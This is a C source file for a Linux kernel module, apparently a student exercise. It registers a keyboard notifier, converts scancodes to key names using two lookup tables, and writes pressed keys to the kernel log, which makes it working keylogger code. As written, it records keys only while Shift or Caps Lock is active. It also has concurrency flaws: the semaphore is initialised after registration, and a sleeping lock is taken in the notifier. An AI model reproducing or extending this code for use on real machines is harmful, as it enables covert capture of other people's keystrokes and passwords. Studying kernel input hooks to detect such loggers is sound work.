//////////////////////////////////////////////////////////////////////////////////////
//////////------------------------CED17I008-----------------------------//////////////
/////////--------------------Dikshanya Lashmi R-------------------------//////////////
//////////////////////////////////////////////////////////////////////////////////////

#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>


static const char *keymap[] = { 
    "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "_BACKSPACE_", "_TAB_", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
    "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f", "g", "h", "j", "k", "l",
    ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",",
    ".", "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_",
    "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_",
    "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
    "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0",
    "\0", "\0", "_F11_", "_F12_", "\0", "\0", "\0", "\0", "\0", "\0", "\0",
    "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_", "_UP_",
    "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_",
    "_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_PAUSE_"
}; 

static const char *keymapShiftActivated[] = {
    "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
    "_BACKSPACE_", "_TAB_", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
    "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F", "G", "H", "J", "K", "L",
    ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<",
    ">", "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_",
    "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_",
    "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
    "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0",
    "\0", "\0", "_F11_", "_F12_", "\0", "\0", "\0", "\0", "\0", "\0", "\0",
    "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_", "_UP_",
    "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_",
    "_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_PAUSE_"
}; 

int capsl=0;

struct semaphore sem;

static int shiftKeyPressed = 0;

int keyb_notify(struct notifier_block *nblock, unsigned long code,void *_param)
{ 
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE)
    {
    	////////////////////////////////////////////////
        ////-------CHECKING IF SHIFT IS USED--------////
        ////////////////////////////////////////////////
        if (param->value==42 || param->value==54)
        {
            down(&sem);
            if (param->down)
                shiftKeyPressed = 1;
            else
                shiftKeyPressed = 0;
            up(&sem);
            return NOTIFY_OK;
        }
        ////////////////////////////////////////////////
        ////------CHECKING IF CAPSLOCK IS USED------////
        ////////////////////////////////////////////////
		if(param->value == 58)
		{
			down(&sem);
			if(param->down)
			{
				if(capsl==0)
					capsl=1;
				else
					capsl=0;
			}
			up(&sem);
            return NOTIFY_OK;
				
		}
        if (param->down)
        {
            down(&sem);
            if (shiftKeyPressed == 1 || capsl == 1 )
            {
            	printk(KERN_INFO "%s\n", keymapShiftActivated[param->value]);
            }
            else
            {
            	//printk("Not Capital\n");
            }    
            up(&sem);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keyb_nb =
{
    .notifier_call = keyb_notify
};

int init_module(void)
{
    register_keyboard_notifier(&keyb_nb);
    printk(KERN_INFO "Registering module with the keyboard" "notifier list\n");
    sema_init(&sem, 1);
    return 0;
}

void cleanup_module(void)
{
    unregister_keyboard_notifier(&keyb_nb);
    printk(KERN_INFO "Unregistered the keyC module\n");
}

MODULE_LICENSE("GPL");